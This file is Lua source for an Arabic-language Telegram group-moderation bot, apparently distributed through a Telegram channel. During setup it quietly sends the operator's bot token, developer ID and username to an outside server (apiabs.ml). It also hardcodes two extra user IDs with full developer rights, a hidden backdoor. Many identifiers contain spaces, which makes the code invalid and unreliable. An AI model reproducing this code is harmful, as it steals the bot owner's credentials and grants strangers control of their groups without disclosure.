------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.--
--   This Is The Source Channel @BLACK_TEAM_4 .   --
--                - Dev Joker -                 --
--        -- https://t.me/BLACK_TEAM_4 --         --
------------------------------------------------ 
redis = require('redis')
URL = require('socket.url')  
HTTPS = require ("ssl.https")  
https = require ("ssl.https") 
http  = require ("socket.http")
serpent = require("serpent")
json = dofile('./JSON.lua')
JSON = dofile('./dkjson.lua')
lgi = require('lgi')
notify = lgi.require('Notify')
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates")
DevAbs = Redis.connect('127.0.0.1', 6379)
ServerDev Joker = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
chats = {}
day = 313456502
--     Source Joker     --
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
if not DevAbs:get(ServerDev Joker.."IdDev Joker") then
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m')
local SUDO = io.read()
if SUDO ~= '' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m')
DevAbs:set(ServerDev Joker.."IdDev Joker",SUDO)
else
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
end 
os.execute('lua Dev Joker.lua')
end
if not DevAbs:get(ServerDev Joker.."UserDev Joker") then
io.write('\27[1;35m\nالان ارسل معرف المطور الاساسي ↫ ⤈\n\27[0;33;49m')
local username = io.read():gsub('@','')
if username ~= '' then
io.write('\n\27[1;34mتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
DevAbs:set(ServerDev Joker.."UserDev Joker",'@'..username)
else
print('\n\27[1;34m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ معرف المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
end 
os.execute('lua Dev Joker.lua')
end
if not DevAbs:get(ServerDev Joker.."TokenDev Joker") then
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
else
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m')
DevAbs:set(ServerDev Joker.."TokenDev Joker",token)
end 
else
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
end 
os.execute('lua Dev Joker.lua')
end
local SUDO = DevAbs:get(ServerDev Joker.."IdDev Joker")
local username = DevAbs:get(ServerDev Joker.."UserDev Joker")
local token = DevAbs:get(ServerDev Joker.."TokenDev Joker")
botid = token:match("(%d+)")
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
username = username, 
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
https.request("https://apiabs.ml/Dev Joker.php?SUDO="..SUDO.."&username="..username.."&token="..token)
file = io.open("RUNABS.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./Dev Joker.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("ABS", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNABS.sh
done
]])  
file:close() 
os.execute('./ABS')
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
end
local load_DevAbs = function()  
local f = io.open("./config.lua", "r")  
if not f then 
AutoSet()  
else   
f:close() 
DevAbs:del(ServerDev Joker.."IdDev Joker");DevAbs:del(ServerDev Joker.."UserDev Joker");DevAbs:del(ServerDev Joker.."TokenDev Joker")
end  
local config = loadfile("./config.lua")() 
return config 
end  
_DevAbs = load_DevAbs() 
print("\27[36m"..[[                                           
---------------------------------------------
]]..'\27[m')
sudos = dofile("./config.lua") 
DevId = sudos.SUDO 
sudo_users = {sudos.sudo_users,218385683,1330377150} 
bot_id = sudos.bot_id 
Dev Joker = sudos.bot_id
SudoUser = sudos.username
TokenBot = sudos.token
name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'وايت بلاك')
DevUser = SudoUser:gsub('@','') 
DevUser = DevUser:gsub([[\_]],'_')
--     Source Joker     --
--     Start Functions    --
----------Bot Owner---------
function is_leader(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(DevId) then var = true end return var end 
function is_leaderid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------  Sudo  ----------
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(DevId) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------  SudoBot  ---------
function is_SudoBot(user_id)
local var = false local absb = 'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..absb, user_id)
if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------Owner all---------
function is_ownerall(user_id, chat_id)
local var = false local abs =  'abs:ownerall:' local ownerall = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id)
if ownerall then var = true end if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------admin all---------
function is_adminall(user_id, chat_id)
local var = false local abs =  'abs:adminall:' local adminall = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:ownerall:' local ownerall = DevAbs:sismember(Dev Joker..absss, user_id)
if adminall then var = true end if SudoBot then var = true end if ownerall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
------ VIP MEMBER ALL ------
function is_vipall(user_id)
local var = false local abss =  'abs:vipall:' local vpall = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:ownerall:' local ownerall = DevAbs:sismember(Dev Joker..absss, user_id) local abssss = 'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abssss, user_id) local absssss =  'abs:adminall:' local adminall = DevAbs:sismember(Dev Joker..absssss, user_id)
if vpall then var = true end if ownerall then var = true end if SudoBot then var = true end if adminall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------  absmonsh  ---------
function is_absmonsh(user_id, chat_id)
local var = false local abs =  'abs:absmonsh:'..chat_id local absmonsh = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id)
if absmonsh then var = true end if SudoBot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------  monsh  ---------
function is_monsh(user_id, chat_id)
local var = false local abs =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevAbs:sismember(Dev Joker..absss, user_id)
if monsh then var = true end if SudoBot then var = true end if absmonsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
---------  monshid  ---------
function is_monshid(user_id, chat_id)
local var = false local abs =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevAbs:sismember(Dev Joker..absss, user_id) local abssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(Dev Joker..abssss, user_id)
if monshid then var = true end if SudoBot then var = true end if absmonsh then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------  Owner  ---------
function is_owner(user_id, chat_id)
local var = false local abs =  'abs:owners:'..chat_id local owner = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevAbs:sismember(Dev Joker..absss, user_id) local abssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(Dev Joker..abssss, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(Dev Joker..abas, user_id)
if owner then var = true end if SudoBot then var = true end if absmonsh then var = true end if monsh then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
----------  admin  ---------
function is_admin(user_id, chat_id)
local var = false local abs =  'abs:admins:'..chat_id local admins = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevAbs:sismember(Dev Joker..absss, user_id) local abssss =  'abs:absmonsh:'..chat_id local absmonsh = DevAbs:sismember(Dev Joker..abssss, user_id) local absssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(Dev Joker..absssss, user_id) local abssssss =  'abs:ownerall:' local ownerall = DevAbs:sismember(Dev Joker..abssssss, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(Dev Joker..abas, user_id)
if admins then var = true end if owner then var = true end if SudoBot then var = true end if absmonsh then var = true end if monsh then var = true end if ownerall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
---------VIP MEMBER---------
function is_vipmem(user_id, chat_id)
local var = false local abs =  'abs:admins:'..chat_id local admins = DevAbs:sismember(Dev Joker..abs, user_id) local abss =  'abs:SudoBot:' local SudoBot = DevAbs:sismember(Dev Joker..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevAbs:sismember(Dev Joker..absss, user_id) local abssss = 'abs:vipmem:'..chat_id local vipmem = DevAbs:sismember(Dev Joker..abssss, user_id) local absssss =  'abs:absmonsh:'..chat_id local absmonsh = DevAbs:sismember(Dev Joker..absssss, user_id) local abssssss =  'abs:monsh:'..chat_id local monsh = DevAbs:sismember(Dev Joker..abssssss, user_id) local absssssss =  'abs:ownerall:' local ownerall = DevAbs:sismember(Dev Joker..absssssss, user_id) local absabs =  'abs:adminall:' local adminall = DevAbs:sismember(Dev Joker..absabs, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevAbs:sismember(Dev Joker..abas, user_id)
if vipmem then var = true end if admins then var = true end if owner then var = true end if SudoBot then var = true end if absmonsh then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source Joker     --
---------FreeWords----------
local function is_free(msg, value)
local var = false
local abs = (Dev Joker..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end
end
end
return var
end
--     Source Joker     --
---------  Banned  ---------
local function is_Ban(user_id, chat_id)
local var = false
local abs = 'abs:Ban:'..chat_id
local banned = DevAbs:sismember(Dev Joker..abs, user_id)
if banned then
var = true
end
return var
end
--     Source Joker     --
----------  Muted  ---------
local function is_Muted(user_id, chat_id)
local var = false
local abs = 'abs:Muted:'..chat_id
local muted = DevAbs:sismember(Dev Joker..abs, user_id)
if muted then
var = true
end
return var
end
--     Source Joker     --
---------  BanAll  ---------
function is_BanAll(user_id)
local var = false
local abs = 'abs:BanAll:'
local BanAll = DevAbs:sismember(Dev Joker..abs, user_id)
if BanAll then
var = true
end
return var
end
--     Source Joker     --
---------  MuteAll  ---------
function is_MuteAll(user_id)
local var = false
local abs = 'abs:MuteAll:'
local MuteAll = DevAbs:sismember(Dev Joker..abs, user_id)
if MuteAll then
var = true
end
return var
end
--     Source Joker     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     Source Joker     --
local function DevAbs13(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
--     Source Joker     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source Joker     --
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= Dev Joker:lower() then 
DevAbs13(chat,msg.id_,"⌁︙عذرا هذا الملف ليس تابع لهذا السورس")   
return false 
end
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
DevAbs13(chat,msg.id_,"⌁︙جاري رفع الملف ... .")
else
DevAbs13(chat,msg.id_,"⌁︙لقد حدث خطاء \n⌁︙يرجى التحقق من صيغة الملف ")
end
local info_file = io.open('./'..Dev Joker..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
DevAbs13(chat,msg.id_,"⌁︙تم رفع النسخه بنجاح \n⌁︙تم تفعيل جميع المجموعات \n⌁︙تم استرجاع مشرفين المجموعات \n⌁︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
DevAbs:sadd(Dev Joker.."bot:groups",idg)
DevAbs:sadd(Dev Joker.."bot:userss",idg)
DevAbs:set(Dev Joker.."bot:enable:"..idg,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, idg)
DevAbs:set(Dev Joker..'editmsg'..idg,true)
DevAbs:set(Dev Joker..'bot:bots:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:bots:ban'..idg,true)
DevAbs:set(Dev Joker..'keed_bots'..idg,true)
DevAbs:set(Dev Joker..'anti-flood:'..idg,true)
DevAbs:set(Dev Joker..'bot:inline:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:photo:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:spam:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:video:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:gifs:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:music:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:voice:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:links:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:location:mute'..idg,true)
DevAbs:set(Dev Joker..'tags:lock'..idg,true)
DevAbs:set(Dev Joker..'bot:document:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:abstag:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:contact:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:webpage:mute'..idg,true)
DevAbs:set(Dev Joker..'bot:sticker:mute'..idg,true)
DevAbs:set(Dev Joker..'markdown:lock'..idg,true)
DevAbs:set(Dev Joker..'bot:forward:mute'..idg,true)
if v.ABSMNSH then
for k,idabsmsh in pairs(v.ABSMNSH) do
DevAbs:sadd(Dev Joker..'abs:absmonsh:'..idg,idabsmsh)  
print('تم رفع منشئين المجموعات')
end
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
DevAbs:sadd(Dev Joker..'abs:monsh:'..idg,idmsh)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.MNSHID then
for k,idmshid in pairs(v.MNSHID) do
DevAbs:sadd(Dev Joker..'abs:monshid:'..idg,idmshid)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
DevAbs:sadd(Dev Joker..'abs:owners:'..idg,idmder)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
DevAbs:sadd(Dev Joker..'abs:admins:'..idg,idmod)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.VIP then
for k,idvip in pairs(v.VIP) do
DevAbs:sadd(Dev Joker..'abs:vipmem:'..idg,idvip)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.linkgroup then
if v.linkgroup ~= "" then
DevAbs:set(Dev Joker.."bot:group:link"..idg,v.linkgroup)   
print('( تم وضع روابط المجموعات )')
end
end
end
end
--     Source Joker     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source Joker     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--     Source Joker     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source Joker     --
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     Source Joker     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source Joker     --
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     Source Joker     --
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     Source Joker     --
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     Source Joker     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source Joker     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source Joker     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--     Source Joker     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--     Source Joker     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
--     Source Joker     --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source Joker     --
function dl_cb(arg, data)
end
--     Source Joker     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     Source Joker     --
function Dev_Abs(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     Source Joker     --
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--     Source Joker     --
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     Source Joker     --
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--     Source Joker     --
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--     Source Joker     --
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     Source Joker     --
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     Source Joker     --
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     Source Joker     --
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--     Source Joker     --
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--     Source Joker     --
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source Joker     --
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url)  
end
--     Source Joker     --
function send_inline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
--     Source Joker     --
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     Source Joker     --
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
--     Source Joker     --
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--     Source Joker     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     Source Joker     --
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source Joker     --
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--     Source Joker     --
local abs_rank = function(msg) if is_leaderid(msg.sender_user_id_) then ABS_PROX  = "المطور" elseif is_sudoid(msg.sender_user_id_) then ABS_PROX = "المطور" elseif is_SudoBot(msg.sender_user_id_) then ABS_PROX = "المطور" elseif is_ownerall(msg.sender_user_id_) then ABS_PROX = "المدير" elseif is_adminall(msg.sender_user_id_) then ABS_PROX = "الادمن" elseif is_absmonsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المنشئ" elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المنشئ" elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المنشئ" elseif is_owner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "المدير" elseif is_admin(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = "الادمن" else ABS_PROX = "العضو" end return ABS_PROX end
